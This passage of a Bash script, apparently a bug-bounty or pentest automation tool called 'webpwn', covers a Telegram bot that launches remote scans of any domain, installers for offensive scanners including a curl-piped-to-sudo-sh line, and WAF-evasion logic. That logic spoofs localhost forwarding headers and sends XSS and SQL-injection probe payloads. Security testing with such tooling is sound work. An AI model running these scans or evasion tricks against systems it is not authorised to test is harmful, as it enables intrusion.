    notify_tg "ðŸ¤– *webpwn bot online*
Send me commands:
/scan \`example.com\` â€” start new scan
/status â€” running scan status
/findings â€” current findings
/stop â€” stop scan
/help â€” show commands"

    log_ok "Bot listening for Telegram commands. Press Ctrl+C to stop."
    local active_pid=""

    # Helper: read a field from the shared state file
    state_get() { grep "^${1}=" "$STATE_FILE" 2>/dev/null | cut -d= -f2-; }
    # Helper: check if a scan is active (via state file PID or local active_pid)
    scan_active() {
        local pid
        pid=$(state_get PID)
        [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null && return 0
        [[ -n "$active_pid" ]] && kill -0 "$active_pid" 2>/dev/null && return 0
        return 1
    }
    # Helper: get active scan PID (state file takes precedence)
    scan_pid() {
        local pid
        pid=$(state_get PID)
        if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then echo "$pid"; return; fi
        echo "$active_pid"
    }

    # Skip backlog: fetch all pending updates, find the highest update_id,
    # then start polling from the next one so old messages are ignored
    local last_id; last_id=$(curl -s \
        "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=100" \
        --connect-timeout 8 --max-time 12 2>/dev/null | \
        python3 -c "
import sys,json
try:
    r = json.load(sys.stdin).get('result',[])
    print(max(u['update_id'] for u in r) if r else 0)
except: print(0)" 2>/dev/null || echo "0")
    log_ok "Skipped backlog (last_id=${last_id}) â€” only responding to new messages."

    while true; do
        local updates; updates=$(curl -s \
            "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=$((last_id+1))&timeout=30&limit=10" \
            --connect-timeout 10 --max-time 40 2>/dev/null || echo "")

        [[ -z "$updates" ]] && { sleep 5; continue; }

        local cmds; cmds=$(python3 -c "
import sys, json
try:
    data = json.loads(sys.argv[1])
    for upd in data.get('result', []):
        uid = upd.get('update_id', 0)
        msg = upd.get('message', {})
        chat_id = str(msg.get('chat', {}).get('id', ''))
        msg_id  = msg.get('message_id', 0)
        text = msg.get('text', '').strip()
        if text: print(f'{uid}|{chat_id}|{msg_id}|{text}')
except: pass
" "$updates" 2>/dev/null || echo "")

        while IFS='|' read -r update_id chat_id msg_id text; do
            [[ -z "$update_id" ]] && continue
            last_id="$update_id"
            [[ "$chat_id" != "$TELEGRAM_CHAT_ID" ]] && continue

            local cmd="${text,,}"

            if [[ "$cmd" =~ ^/scan[[:space:]]+(.+)$ ]]; then
                local domain="${BASH_REMATCH[1]// /}"
                if scan_active; then
                    notify_tg "âš ï¸ Scan already running (PID $(scan_pid)) on \`$(state_get TARGET)\`. Use /stop first."
                else
                    notify_tg "ðŸš€ Starting scan for \`${domain}\`..."
                    bash "$0" -d "$domain" \
                        --tg-token "$TELEGRAM_BOT_TOKEN" \
                        --tg-chat "$TELEGRAM_CHAT_ID" \
                        ${DISCORD_WEBHOOK_URL:+--discord "$DISCORD_WEBHOOK_URL"} \
                        &
                    active_pid=$!
                    log_ok "Scan started: PID ${active_pid} â†’ ${domain}"
                fi

            elif [[ "$cmd" == "/stop" ]]; then
                local spid; spid=$(scan_pid)
                if [[ -n "$spid" ]] && kill -0 "$spid" 2>/dev/null; then
                    kill "$spid" 2>/dev/null
                    rm -f "$STATE_FILE"
                    notify_tg "ðŸ›‘ Scan (PID ${spid}) stopped."
                    active_pid=""
                else
                    notify_tg "â„¹ï¸ No active scan to stop."
                fi

            elif [[ "$cmd" == "/status" ]]; then
                if scan_active; then
                    local s_target s_phase s_outdir s_start s_pid
                    s_pid=$(scan_pid)
                    s_target=$(state_get TARGET)
                    s_phase=$(state_get PHASE)
                    s_outdir=$(state_get OUTDIR)
                    s_start=$(state_get START)
                    notify_tg "ðŸ“Š *Scan Status*
Target: \`${s_target}\`
Phase: ${s_phase:-starting}
Output: \`${s_outdir}\`
PID: ${s_pid}
Running since: $(date -d "@${s_start}" '+%H:%M:%S' 2>/dev/null || echo 'N/A')"
                else
                    notify_tg "ðŸ’¤ No scan running. Send \`/scan domain.com\` to start."
                fi

            elif [[ "$cmd" == "/findings" ]]; then
                if [[ -f "$STATE_FILE" ]]; then
                    local s_outdir; s_outdir=$(state_get OUTDIR)
                    local vuln="${s_outdir}/vulns"
                    local n_total n_crit n_xss
                    n_total=$(wc -l < "${vuln}/nuclei/all_findings.jsonl" 2>/dev/null || echo 0)
                    n_crit=$(wc -l < "${vuln}/nuclei/critical_high.jsonl" 2>/dev/null || echo 0)
                    n_xss=$(wc -l < "${vuln}/xss/dalfox_findings.txt" 2>/dev/null || echo 0)
                    notify_tg "ðŸ” *Current Findings* (\`$(state_get TARGET)\`)
Nuclei total: ${n_total}
Critical/High: ${n_crit}
XSS: ${n_xss}"
                else
                    notify_tg "â„¹ï¸ No active scan. No findings available."
                fi

            elif [[ "$cmd" == "/clear" ]]; then
                tg_clear_chat "$msg_id"
                notify_tg "ðŸ§¹ Chat cleared."

            elif [[ "$cmd" == "/help" ]]; then
                notify_tg "ðŸ¤– *webpwn commands:*
/scan \`example.com\` â€” start new scan
/stop â€” stop running scan
/status â€” check if scan is running
/clear â€” delete all bot messages
/help â€” this message"

            elif [[ "$cmd" == "/start" ]]; then
                notify_tg "ðŸ‘‹ webpwn bot ready. Send /help for commands."
            fi

        done <<< "$cmds"
    done
}

# Track current phase name for /status command
CURRENT_PHASE="init"
TG_STOP_REQUESTED=false

state_set() {
    local key="$1" value="${2-}"
    [[ -z "${STATE_FILE:-}" ]] && return 0

    mkdir -p "$(dirname "$STATE_FILE")"
    local tmp; tmp=$(mktemp /tmp/webpwn_state_XXXXXX)
    if [[ -f "$STATE_FILE" ]]; then
        awk -F= -v k="$key" -v v="$value" '
            BEGIN { done=0 }
            $1 == k { print k "=" v; done=1; next }
            { print }
            END { if (!done) print k "=" v }
        ' "$STATE_FILE" > "$tmp"
    else
        printf '%s=%s\n' "$key" "$value" > "$tmp"
    fi
    mv "$tmp" "$STATE_FILE"
}

_phase_checkpoint_name() {
    printf '%s' "$1" | tr -c 'A-Za-z0-9._-' '_'
}

phase_checkpoint_file() {
    [[ -n "${OUTDIR:-}" ]] || return 1
    local safe_name; safe_name=$(_phase_checkpoint_name "$1")
    printf '%s/.phase_%s.done\n' "$OUTDIR" "$safe_name"
}

phase_completed() {
    local checkpoint_file
    checkpoint_file=$(phase_checkpoint_file "$1") || return 1
    [[ -f "$checkpoint_file" ]]
}

mark_phase_completed() {
    local checkpoint_file
    checkpoint_file=$(phase_checkpoint_file "$1") || return 0
    printf 'phase=%s\ncompleted_at=%s\n' "$1" "$(date '+%Y-%m-%d %H:%M:%S %Z')" > "$checkpoint_file"
}

# â”€â”€â”€ Tool helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
has_tool() { command -v "$1" &>/dev/null; }

# Exact install command for each tool
declare -A TOOL_INSTALL_CMDS=(
    [bbot]="pip3 install bbot --break-system-packages"
    [findomain]="curl -sL https://github.com/Findomain/Findomain/releases/latest/download/findomain-linux.zip -o /tmp/fd.zip && unzip -o /tmp/fd.zip -d \${HOME}/go/bin/ && chmod +x \${HOME}/go/bin/findomain && rm /tmp/fd.zip"
    [chaos]="go install github.com/projectdiscovery/chaos-client/cmd/chaos@latest"
    [hakrawler]="go install github.com/hakluke/hakrawler@latest"
    [shodan]="pip3 install shodan --break-system-packages"
    [theHarvester]="git clone --depth 1 https://github.com/laramies/theHarvester \${HOME}/tools/theHarvester && pip3 install \${HOME}/tools/theHarvester --break-system-packages -q"
    [subfinder]="go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    [amass]="go install github.com/owasp-amass/amass/v4/...@master"
    [assetfinder]="go install github.com/tomnomnom/assetfinder@latest"
    [httpx]="go install github.com/projectdiscovery/httpx/cmd/httpx@latest"
    [nuclei]="go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    [katana]="go install github.com/projectdiscovery/katana/cmd/katana@latest"
    [dnsx]="go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    [naabu]="go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
    [shuffledns]="go install github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
    [alterx]="go install github.com/projectdiscovery/alterx/cmd/alterx@latest"
    [notify]="go install github.com/projectdiscovery/notify/cmd/notify@latest"
    [interactsh-client]="go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
    [gau]="go install github.com/lc/gau/v2/cmd/gau@latest"
    [waybackurls]="go install github.com/tomnomnom/waybackurls@latest"
    [anew]="go install github.com/tomnomnom/anew@latest"
    [qsreplace]="go install github.com/tomnomnom/qsreplace@latest"
    [unfurl]="go install github.com/tomnomnom/unfurl@latest"
    [gf]="go install github.com/tomnomnom/gf@latest && git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf"
    [dalfox]="go install github.com/hahwul/dalfox/v2@latest"
    [puredns]="go install github.com/d3mondev/puredns/v2@latest"
    [gowitness]="go install github.com/sensepost/gowitness@latest"
    [subzy]="go install github.com/PentestPad/subzy@latest"
    [subjack]="go install github.com/haccer/subjack@latest"
    [nomore403]="go install github.com/devploit/nomore403@latest"
    [ffuf]="sudo apt install -y ffuf  # or: go install github.com/ffuf/ffuf/v2@latest"
    [nmap]="sudo apt install -y nmap"
    [masscan]="sudo apt install -y masscan"
    [sqlmap]="sudo apt install -y sqlmap"
    [feroxbuster]="sudo apt install -y feroxbuster"
    # massdns: required by puredns; build from source if apt unavailable
    [massdns]="sudo apt install -y massdns  # or: git clone https://github.com/blechschmidt/massdns /tmp/massdns && cd /tmp/massdns && make && cp bin/massdns ~/go/bin/"
    [waymore]="pip3 install waymore"
    [arjun]="pip3 install arjun"
    [trufflehog]="curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin"
    [wafw00f]="pip3 install wafw00f"
    # naabu requires libpcap-dev; install prebuilt binary to avoid CGO issues
    [naabu]="NAABU_VER=\$(curl -s https://api.github.com/repos/projectdiscovery/naabu/releases/latest | grep '\"tag_name\"' | cut -d'\"' -f4); curl -sL \"https://github.com/projectdiscovery/naabu/releases/download/\${NAABU_VER}/naabu_\${NAABU_VER#v}_linux_amd64.zip\" -o /tmp/naabu.zip && unzip -q /tmp/naabu.zip naabu -d ~/go/bin/ && chmod +x ~/go/bin/naabu && rm /tmp/naabu.zip"
    # corsy has no pip package; clone repo and create a wrapper script
    [corsy]="git clone https://github.com/s0md3v/Corsy.git ~/tools/corsy && printf '#!/bin/bash\npython3 ~/tools/corsy/corsy.py \"\$@\"\n' > ~/go/bin/corsy && chmod +x ~/go/bin/corsy"
)

require_tool() {
    local tool="$1"
    if ! has_tool "$tool"; then
        local cmd="${TOOL_INSTALL_CMDS[$tool]:-}"
        if [[ -n "$cmd" ]]; then
            log_warn "Tool not found: ${BOLD}${tool}${RESET} â€” skipping this step"
            log_warn "  Install with: ${CYAN}${cmd}${RESET}"
        else
            log_warn "Tool not found: ${BOLD}${tool}${RESET} â€” skipping this step"
        fi
        return 1
    fi
    return 0
}

# Save a timed-out or skipped command to the deferred script for later execution
defer_cmd() {
    local label="$1"; shift
    local deferred_script="${OUTDIR}/deferred_scans.sh"
    if [[ ! -f "$deferred_script" ]]; then
        echo "#!/usr/bin/env bash" > "$deferred_script"
        echo "# Deferred scans from webpwn â€” run these manually when ready" >> "$deferred_script"
        echo "# Generated: $(date)" >> "$deferred_script"
        chmod +x "$deferred_script"
    fi
    echo -e "\n# ${label}" >> "$deferred_script"
    echo "$*" >> "$deferred_script"
    log_warn "  Timed out â€” command saved to: ${CYAN}${deferred_script}${RESET}  (run later with: bash deferred_scans.sh)"
}

# â”€â”€â”€ Mandatory tool gate â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Tools listed here must be present before any scan phase runs.
# The script exits with a clear install message if any are missing.
MANDATORY_TOOLS=(wafw00f httpx nuclei)

check_mandatory_tools() {
    local missing=()
    for tool in "${MANDATORY_TOOLS[@]}"; do
        has_tool "$tool" || missing+=("$tool")
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "\n${RED}${BOLD}[FATAL] Required tools not found â€” install them before scanning:${RESET}\n"
        for t in "${missing[@]}"; do
            local cmd="${TOOL_INSTALL_CMDS[$t]:-unknown}"
            echo -e "  ${RED}âœ— ${BOLD}${t}${RESET}"
            echo -e "    Install: ${CYAN}${cmd}${RESET}"
        done
        echo -e "\n  Or run: ${CYAN}$0 --install${RESET} to install everything at once.\n"
        exit 1
    fi

    log_ok "Mandatory tools present: ${MANDATORY_TOOLS[*]}"
}

anew_append() {
    # Like `anew` but falls back to sort -u if anew not available
    local file="$1"
    if has_tool anew; then
        anew "$file"
    else
        cat >> "$file"; sort -u "$file" -o "$file"
    fi
}

check_tools() {
    log_phase "Tool Availability Check"
    local tools=(
        subfinder amass assetfinder httpx nuclei katana
        ffuf nmap masscan massdns dnsx puredns shuffledns
        gau waybackurls waymore dalfox sqlmap arjun
        gowitness subzy subjack anew qsreplace unfurl gf
        notify interactsh-client alterx naabu trufflehog
        corsy nomore403 feroxbuster wafw00f jwt_tool
        bbot findomain chaos hakrawler shodan theHarvester
    )
    local missing=()
    for t in "${tools[@]}"; do
        if has_tool "$t"; then
            echo -e "  ${GREEN}âœ“${RESET} $t"
        else
            echo -e "  ${RED}âœ—${RESET} $t"
            missing+=("$t")
        fi
    done
    echo
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}${BOLD}Missing tools â€” exact install commands:${RESET}"
        for t in "${missing[@]}"; do
            local cmd="${TOOL_INSTALL_CMDS[$t]:-unknown â€” run: $0 --install}"
            echo -e "  ${RED}${BOLD}${t}${RESET}"
            echo -e "    ${CYAN}${cmd}${RESET}"
        done
        echo
        log_info "To install everything at once: ${CYAN}$0 --install${RESET}"
    else
        log_ok "All tools available!"
    fi
}

install_tools() {
    log_phase "Installing webpwn Dependencies"
    log_info "This will install Go tools and Python tools. May take a few minutes..."

    # Go tools
    local go_tools=(
        "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
        "github.com/projectdiscovery/httpx/cmd/httpx@latest"
        "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        "github.com/projectdiscovery/katana/cmd/katana@latest"
        "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
        "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
        "github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
        "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
        "github.com/projectdiscovery/alterx/cmd/alterx@latest"
        "github.com/projectdiscovery/notify/cmd/notify@latest"
        "github.com/tomnomnom/waybackurls@latest"
        "github.com/lc/gau/v2/cmd/gau@latest"
        "github.com/tomnomnom/anew@latest"
        "github.com/tomnomnom/qsreplace@latest"
        "github.com/tomnomnom/unfurl@latest"
        "github.com/tomnomnom/gf@latest"
        "github.com/hahwul/dalfox/v2@latest"
        "github.com/d3mondev/puredns/v2@latest"
        "github.com/sensepost/gowitness@latest"
        "github.com/PentestPad/subzy@latest"
        "github.com/haccer/subjack@latest"
        "github.com/devploit/nomore403@latest"
        "github.com/owasp-amass/amass/v4/...@master"
        "github.com/tomnomnom/assetfinder@latest"
        "github.com/projectdiscovery/chaos-client/cmd/chaos@latest"
        "github.com/hakluke/hakrawler@latest"
    )

    for pkg in "${go_tools[@]}"; do
        tool_name=$(basename "${pkg%%@*}" | sed 's/cmd\///')
        echo -ne "  Installing ${CYAN}${tool_name}${RESET}..."
        if go install -v "$pkg" &>/dev/null 2>&1; then
            echo -e " ${GREEN}âœ“${RESET}"
        else
            echo -e " ${RED}âœ— (failed)${RESET}"
        fi
    done

    # massdns â€” required by puredns; build from source (no sudo needed)
    if ! has_tool massdns; then
        log_info "Building massdns from source..."
        local _massdns_dir; _massdns_dir=$(mktemp -d)
        if git clone -q https://github.com/blechschmidt/massdns.git "$_massdns_dir" 2>/dev/null; then
            if (cd "$_massdns_dir" && make -s 2>/dev/null && cp bin/massdns "$HOME/go/bin/" && chmod +x "$HOME/go/bin/massdns"); then
                echo -e "  massdns ${GREEN}âœ“${RESET}"
            else
                echo -e "  massdns ${RED}âœ— (build failed â€” try: sudo apt install -y massdns)${RESET}"
            fi
        else
            echo -e "  massdns ${RED}âœ— (clone failed â€” try: sudo apt install -y massdns)${RESET}"
        fi
        rm -rf "$_massdns_dir"
    else
        echo -e "  massdns ${GREEN}âœ“ (already installed)${RESET}"
    fi

    # naabu â€” requires libpcap; install prebuilt binary to avoid CGO build errors
    log_info "Installing naabu (prebuilt binary)..."
    local naabu_ver
    naabu_ver=$(curl -s https://api.github.com/repos/projectdiscovery/naabu/releases/latest | grep '"tag_name"' | cut -d'"' -f4)
    if [[ -n "$naabu_ver" ]]; then
        local naabu_zip="/tmp/naabu_${naabu_ver}.zip"
        curl -sL "https://github.com/projectdiscovery/naabu/releases/download/${naabu_ver}/naabu_${naabu_ver#v}_linux_amd64.zip" -o "$naabu_zip" && \
        unzip -qo "$naabu_zip" naabu -d "$HOME/go/bin/" && \
        chmod +x "$HOME/go/bin/naabu" && \
        rm -f "$naabu_zip" && \
        echo -e "  naabu ${GREEN}âœ“${RESET}" || echo -e "  naabu ${RED}âœ— (failed)${RESET}"
    else
        echo -e "  naabu ${RED}âœ— (could not fetch release version)${RESET}"
    fi

    # corsy â€” no pip package; clone repo and wrap as a script
    log_info "Installing corsy (from GitHub)..."
    if [[ ! -d "$HOME/tools/corsy" ]]; then
        git clone -q https://github.com/s0md3v/Corsy.git "$HOME/tools/corsy" 2>/dev/null || true
    fi
    if [[ -f "$HOME/tools/corsy/corsy.py" ]]; then
        printf '#!/bin/bash\npython3 %s/tools/corsy/corsy.py "$@"\n' "$HOME" > "$HOME/go/bin/corsy"
        chmod +x "$HOME/go/bin/corsy"
        echo -e "  corsy ${GREEN}âœ“${RESET}"
    else
        echo -e "  corsy ${RED}âœ— (clone failed)${RESET}"
    fi

    # Python tools via pip
    log_info "Installing Python tools..."
    pip3 install -q arjun waymore wafw00f bbot shodan --break-system-packages 2>/dev/null || true

    # findomain â€” prebuilt binary
    log_info "Installing findomain..."
    local _fd_url; _fd_url=$(curl -s https://api.github.com/repos/Findomain/Findomain/releases/latest \
        | grep -oP '"browser_download_url":\s*"\K[^"]+findomain-linux\.zip(?=")' | head -1)
    if [[ -n "$_fd_url" ]]; then
        curl -sL "$_fd_url" -o /tmp/findomain.zip && \
        unzip -qo /tmp/findomain.zip -d "$HOME/go/bin/" && \
        chmod +x "$HOME/go/bin/findomain" && rm -f /tmp/findomain.zip && \
        echo -e "  findomain ${GREEN}âœ“${RESET}" || echo -e "  findomain ${RED}âœ—${RESET}"
    else
        echo -e "  findomain ${RED}âœ— (could not fetch release URL)${RESET}"
    fi

    # theHarvester â€” real version from GitHub (pip package is a stub)
    log_info "Installing theHarvester..."
    if [[ ! -d "$HOME/tools/theHarvester" ]]; then
        git clone -q --depth 1 https://github.com/laramies/theHarvester "$HOME/tools/theHarvester" 2>/dev/null || true
    fi
    if [[ -d "$HOME/tools/theHarvester" ]]; then
        pip3 install -q "$HOME/tools/theHarvester" --break-system-packages 2>/dev/null || true
        echo -e "  theHarvester ${GREEN}âœ“${RESET}"
    else
        echo -e "  theHarvester ${RED}âœ— (clone failed)${RESET}"
    fi

    # jwt_tool â€” JWT attack toolkit
    log_info "Installing jwt_tool..."
    if [[ ! -d "$HOME/tools/jwt_tool" ]]; then
        git clone -q https://github.com/ticarpi/jwt_tool.git "$HOME/tools/jwt_tool" 2>/dev/null || true
    fi
    if [[ -f "$HOME/tools/jwt_tool/jwt_tool.py" ]]; then
        pip3 install -q termcolor cprint pycryptodomex requests 2>/dev/null || true
        printf '#!/bin/bash\npython3 %s/tools/jwt_tool/jwt_tool.py "$@"\n' "$HOME" > "$HOME/go/bin/jwt_tool"
        chmod +x "$HOME/go/bin/jwt_tool"
        echo -e "  jwt_tool ${GREEN}âœ“${RESET}"
    else
        echo -e "  jwt_tool ${RED}âœ— (clone failed â€” manual install: github.com/ticarpi/jwt_tool)${RESET}"
    fi

    # Apt tools
    log_info "Installing apt tools..."
    sudo apt-get install -y -qq nmap masscan ffuf feroxbuster sqlmap 2>/dev/null || true

    # GF patterns
    if has_tool gf && [[ ! -d ~/.gf ]]; then
        log_info "Setting up GF patterns..."
        git clone -q https://github.com/1ndianl33t/Gf-Patterns ~/.gf 2>/dev/null || true
    fi

    # Update Nuclei templates
    if has_tool nuclei; then
        log_info "Updating Nuclei templates..."
        nuclei -update-templates -silent 2>/dev/null || true
    fi

    # Install Playwright/Chromium for headless JS login bypass
    log_info "Installing Playwright + Chromium (headless browser)..."
    pip3 install -q playwright --break-system-packages 2>/dev/null || true
    python3 -m playwright install chromium 2>/dev/null || true
    echo -e "  playwright/chromium ${GREEN}âœ“${RESET}"

    # Ensure the status dashboard script is executable
    local _script_dir; _script_dir="$(dirname "$(realpath "$0")")"
    if [[ -f "${_script_dir}/scan_status.sh" ]]; then
        chmod +x "${_script_dir}/scan_status.sh"
        echo -e "  scan_status.sh ${GREEN}âœ“${RESET} â†’ ${_script_dir}/scan_status.sh"
    else
        echo -e "  scan_status.sh ${YELLOW}not found${RESET} in ${_script_dir}"
    fi

    log_ok "Installation complete. Run: $0 --check"
}

setup_notify_config() {
    # Create a sample notify.conf if not present
    if [[ ! -f "$NOTIFY_CONF" ]]; then
        mkdir -p "$(dirname "$NOTIFY_CONF")"
        cat > "$NOTIFY_CONF" << 'CONF'
# webpwn notification configuration
# Uncomment and fill in the values you want to use

# Telegram Bot (get token from @BotFather, get your chat ID from @userinfobot)
#TELEGRAM_BOT_TOKEN=123456789:AAAA_your_bot_token_here
#TELEGRAM_CHAT_ID=987654321

# Discord Webhook (Server Settings â†’ Integrations â†’ Webhooks â†’ Copy URL)
#DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...

# Email via SMTP (Gmail: use App Password, not your real password)
#NOTIFY_EMAIL_TO=you@example.com
#SMTP_HOST=smtp.gmail.com
#SMTP_PORT=587
#SMTP_USER=yourbot@gmail.com
#SMTP_PASS=your_app_password_here
CONF
        log_ok "Created sample notify config: ${NOTIFY_CONF}"
        log_info "Edit it and add your Telegram/Discord/Email credentials."
    fi
}

# â”€â”€â”€ Resolver setup â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
setup_resolvers() {
    if [[ -f "$RESOLVERS" ]] && $RESUME; then
        log_dim "  Resolvers already downloaded, skipping."
        return
    fi
    log_info "Downloading fresh DNS resolvers..."
    if curl -s --connect-timeout 10 "$RESOLVERS_URL" -o "$RESOLVERS" 2>/dev/null; then
        local count; count=$(wc -l < "$RESOLVERS")
        log_ok "  Got ${count} resolvers"
    else
        log_warn "  Could not download resolvers. Using system defaults."
        echo -e "8.8.8.8\n8.8.4.4\n1.1.1.1\n1.0.0.1\n9.9.9.9" > "$RESOLVERS"
    fi
}

# â”€â”€â”€ WAF helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

# Apply per-WAF scan profile â€” sets RATE_LIMIT, WAF_DELAY, WAF_ENCODE, WAF_EVASION_CURL_OPTS
apply_waf_profile() {
    WAF_ENCODE=true
    case "${WAF_NAME,,}" in
        cloudflare)           RATE_LIMIT=10;  WAF_DELAY=2 ;;
        akamai)               RATE_LIMIT=15;  WAF_DELAY=1 ;;
        modsecurity)          RATE_LIMIT=20;  WAF_DELAY=1 ;;
        sucuri)               RATE_LIMIT=10;  WAF_DELAY=2 ;;
        imperva|incapsula)    RATE_LIMIT=10;  WAF_DELAY=2 ;;
        aws-waf)              RATE_LIMIT=15;  WAF_DELAY=1 ;;
        f5-bigip)             RATE_LIMIT=15;  WAF_DELAY=1 ;;
        barracuda)            RATE_LIMIT=15;  WAF_DELAY=1 ;;
        fortinet)             RATE_LIMIT=15;  WAF_DELAY=1 ;;
        wordfence)            RATE_LIMIT=20;  WAF_DELAY=1 ;;
        litespeed-waf)        RATE_LIMIT=20;  WAF_DELAY=1 ;;
        *)                    RATE_LIMIT=20;  WAF_DELAY=1 ;;
    esac
    WAF_RATE_LIMIT="$RATE_LIMIT"

    # Build evasion curl opts â€” injected into SQLi / XSS probe requests when WAF present.
    # Rotate through a short UA list so each probe looks like a different browser session.
    local -a _uas=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    )
    local _ua_idx=$(( RANDOM % ${#_uas[@]} ))
    WAF_EVASION_CURL_OPTS=(
        -H "User-Agent: ${_uas[$_ua_idx]}"
        -H "X-Forwarded-For: 127.0.0.1"
        -H "X-Real-IP: 127.0.0.1"
        -H "Accept-Language: en-US,en;q=0.9"
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    )
}

# Honour WAF_BYPASS_MODE even when no WAF was auto-detected
_apply_bypass_mode_if_forced() {
    if $WAF_BYPASS_MODE && ! $WAF_DETECTED; then
        WAF_DETECTED=true
        WAF_NAME="user-forced"
        apply_waf_profile
        log_warn "--waf-bypass: forced evasion mode (rate=${RATE_LIMIT} req/s, delay=${WAF_DELAY}s, encoding=ON)"
    fi
}

# Sleep WAF_DELAY seconds â€” call between consecutive test requests when WAF present
waf_sleep() { [[ "${WAF_DELAY:-0}" -gt 0 ]] && sleep "$WAF_DELAY" || true; }

# â”€â”€â”€ Early WAF probe (pre-auth) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Lightweight WAF fingerprint that runs BEFORE setup_auth so login requests
# are already WAF-aware (rate limit, delay, evasion headers).
# Full phase_waf still runs later for the authoritative live-hosts sweep.
_early_waf_probe() {
    local probe_url="${AUTH_LOGIN_URL:-https://${TARGET}}"
    [[ -z "$probe_url" || "$probe_url" == "https://" ]] && return 0

    log_info "Early WAF probe: ${probe_url}"

    # 1. Header-based fingerprint (passive â€” no trigger payload)
    local headers; headers=$(curl -s -I --connect-timeout 10 --max-time 15 \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
        "$probe_url" 2>/dev/null)
    local waf_hdr; waf_hdr=$(_waf_from_headers "$headers")

    # 2. Trigger probe â€” WAF-blocking patterns in query
    local probe_test="${probe_url%/}/?waftest=%3Cscript%3Ealert(1)%3C/script%3E&id=1'+OR+'1'%3D'1"
    local probe_code; probe_code=$(curl -s -o /dev/null -w "%{http_code}" \
        --connect-timeout 10 --max-time 10 "$probe_test" 2>/dev/null)
    local probe_body; probe_body=$(curl -s --connect-timeout 10 --max-time 10 \
        "$probe_test" 2>/dev/null | head -50)
    local waf_block=""
    if [[ "$probe_code" =~ ^(403|406|429|503|999)$ ]]; then
        waf_block=$(_waf_from_block_body "$probe_body")
        [[ -z "$waf_block" ]] && waf_block="generic-waf"
    fi

    # 3. Consolidate: header detection wins over block heuristic
    if [[ -n "$waf_hdr" ]]; then
        WAF_DETECTED=true; WAF_NAME="$waf_hdr"
        log_warn "Early WAF probe: WAF detected via response headers â†’ ${BOLD}${WAF_NAME}${RESET}"
    elif [[ -n "$waf_block" ]]; then
        WAF_DETECTED=true; WAF_NAME="$waf_block"
        log_warn "Early WAF probe: WAF detected via blocked probe (HTTP ${probe_code}) â†’ ${BOLD}${WAF_NAME}${RESET}"
    fi

    # 4. wafw00f â€” authoritative identification (30s cap so it doesn't delay startup)
    if require_tool wafw00f; then
        log_info "Early WAF probe: running wafw00f..."
        local wf; wf=$(timeout 30 wafw00f "$probe_url" 2>/dev/null \
            | grep -iE "detected|is behind" | head -1)
        if [[ -n "$wf" ]]; then
            local wf_name; wf_name=$(echo "$wf" \
                | grep -oiE "(Cloudflare|Akamai|Sucuri|Imperva|Incapsula|AWS|F5 BIG-IP|Barracuda|Fortinet|FortiWeb|Wordfence|ModSecurity|LiteSpeed|Generic)" \
                | head -1 | tr '[:upper:]' '[:lower:]' | tr ' ' '-')
            if [[ -n "$wf_name" ]]; then
                WAF_DETECTED=true
                WAF_NAME="$wf_name"
